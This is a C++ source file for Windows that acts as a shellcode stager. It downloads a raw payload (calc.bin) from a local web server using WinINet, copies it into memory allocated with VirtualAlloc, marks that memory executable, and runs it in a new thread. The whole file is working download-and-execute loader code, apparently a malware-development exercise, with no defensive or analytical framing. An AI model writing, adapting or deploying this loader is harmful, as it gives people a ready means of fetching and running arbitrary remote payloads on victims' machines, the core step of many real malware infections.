// Payload_Web_Server.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#pragma comment(lib, "wininet.lib")
#include <Windows.h>
#include <wininet.h>
#include <iostream>



int Get_Web_Payload(OUT PBYTE* pPayloadBytes) {
    
    PBYTE downloaded_payload = NULL;
    DWORD num_bytes;
    int file_size = 0;


    //Open a handle to an internet session
    HANDLE hInternet = InternetOpenW(NULL,NULL, NULL,NULL,NULL);
    if (hInternet == NULL) {
        printf("[!] InternetOpenW failed with error : %d\n", GetLastError());
    }


    //Open Handle to the given resource URL
    HANDLE hInternet_Resource = InternetOpenUrlW(hInternet, L"http://127.0.0.1:8000/calc.bin", NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
    if (hInternet_Resource == NULL) {
        printf("[!] InternetOpenUrlW Failed with error : %d \n", GetLastError());
    }


    //Allocate Space on the Heap
    HANDLE Temp_Bytes = LocalAlloc(LPTR, 1024);
    if (Temp_Bytes == NULL) {
        printf("[!] Local Alloc failed to allocate memory on the heap with error : %d", GetLastError());
    }


    
    while (TRUE) {
        //Read 1024 Bytes temporarily into the Temp_Bytes Space
        if (!InternetReadFile(hInternet_Resource, Temp_Bytes, 1024, &num_bytes)) {
            printf("\n[!] InternetReadFile Failed With Error : %d \n", GetLastError());
            exit(0);
        }

       //Increase file size as we read more bytes
        file_size += num_bytes;

        //Check if the pointer to payload_space is null, if it is null then allocate a new space (Indicating Initialization of the space)
        if (downloaded_payload == NULL) {
            downloaded_payload = (PBYTE)LocalAlloc(LPTR, num_bytes);
        }

        //Else we re Allocate the space and increase it by the current file_size
        else {
            downloaded_payload = (PBYTE)LocalReAlloc(downloaded_payload, file_size, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }

        //Now mem copy the  from Temp_Bytes to this newly allocated space, starting from filesize - num_bytes
        //meaning we start from the end of the prev written byte.
        memcpy((PVOID)(downloaded_payload + (file_size - num_bytes)), Temp_Bytes, num_bytes);
        
        //Now we clear Temp_Bytes
        memset(Temp_Bytes, '\0', num_bytes);
        
        //Check if num_bytes is less than 1024, if yes then we break. Because it's EOF.
        if (num_bytes < 1024) break;
    }

    //Copy the shellcode to payload_bytes as a pointer.
    *pPayloadBytes = downloaded_payload;


    //Close all the used Handles
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternet_Resource);
    InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);

    return file_size;
}


int main()
{

    printf("\n++++++++++++++++++++++++++++");
    printf("\n++++++++++++++++++++++++++++");
    printf("\n\n[*] Payload_Web_Download [*]\n");
    printf("\n++++++++++++++++++++++++++++");
    printf("\n++++++++++++++++++++++++++++\n");

    PBYTE payload_mem = NULL;
    DWORD dwOldProtection;
    int file_size = 0;


    file_size = Get_Web_Payload(&payload_mem);

    //Allocate Memory Space to cope the bytes to
    PVOID exec_mem = VirtualAlloc(0, file_size, MEM_COMMIT | MEM_RESERVE , PAGE_READWRITE);
    if (exec_mem == NULL) {
        printf("\n[!] VirtualAlloc Failed with error : %d", GetLastError());
    }


    //Move it to new memory region
    RtlMoveMemory(exec_mem, payload_mem, file_size);


    //Make the allocated virtual memory region Executable
    BOOL rv = VirtualProtect(exec_mem,file_size, PAGE_EXECUTE_READWRITE, &dwOldProtection);
    if (!rv) {
        printf("[!] VIRTUAL PROTECT FAILED WITH ERROR : %d", GetLastError());
    }

    //Create Thread and run the shellcode
    HANDLE Thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)exec_mem, NULL, NULL, NULL);
    if (Thread == NULL) {
        printf("[*] CreateThread Failed with error : %d", GetLastError());
        exit(1);
    }
    WaitForSingleObject(Thread, -1);
    return 0;
}
